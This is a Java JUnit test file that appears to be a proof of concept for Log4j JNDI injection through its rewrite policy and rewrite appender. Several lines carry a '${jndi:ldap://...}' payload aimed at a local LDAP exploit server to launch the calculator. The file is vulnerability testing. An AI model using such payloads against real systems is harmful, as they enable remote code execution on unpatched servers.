import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.core.Appender;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.appender.ConsoleAppender;
import org.apache.logging.log4j.core.appender.rewrite.PropertiesRewritePolicy;
import org.apache.logging.log4j.core.appender.rewrite.RewriteAppender;
import org.apache.logging.log4j.core.appender.rewrite.RewritePolicy;
import org.apache.logging.log4j.core.config.AppenderRef;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.DefaultConfiguration;
import org.apache.logging.log4j.core.config.Property;
import org.apache.logging.log4j.core.filter.ThresholdFilter;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.apache.logging.log4j.core.layout.PatternLayout;
import org.junit.jupiter.api.Test;


public class RewriterPocTests {

    @Test
    public void rewritePropertiesRewritePolicyTest() {
        Configuration configuration = new DefaultConfiguration();
        Property[] properties = new Property[]{
                Property.createProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };

        RewritePolicy policy = PropertiesRewritePolicy.createPolicy(configuration, properties);
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        LogEvent rewrittenEvent = policy.rewrite(logEvent);
    }

    @Test
    public void appendRewritePolicyTest() {
        LoggerContext context = new LoggerContext("TestContext");
        Configuration config = context.getConfiguration();

        Appender consoleAppender = ConsoleAppender.createDefaultAppenderForLayout(PatternLayout.createDefaultLayout(config));
        consoleAppender.start();

        AppenderRef appenderRef = AppenderRef.createAppenderRef("console", null, null);
        AppenderRef[] refs = new AppenderRef[]{appenderRef};

        Property[] properties = new Property[]{
                Property.createProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };
        RewritePolicy rewritePolicy = PropertiesRewritePolicy.createPolicy(config, properties);

        RewriteAppender rewriteAppender = RewriteAppender.createAppender(
                "rewriteAppender",
                "false",
                refs,
                config,
                rewritePolicy,
                ThresholdFilter.createFilter(Level.ALL, null, null)
        );
        rewriteAppender.start();


        config.addAppender(consoleAppender);
        config.addAppender(rewriteAppender);
        context.updateLoggers();

        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        rewriteAppender.append(logEvent);

        rewriteAppender.stop();
        consoleAppender.stop();
    }
}
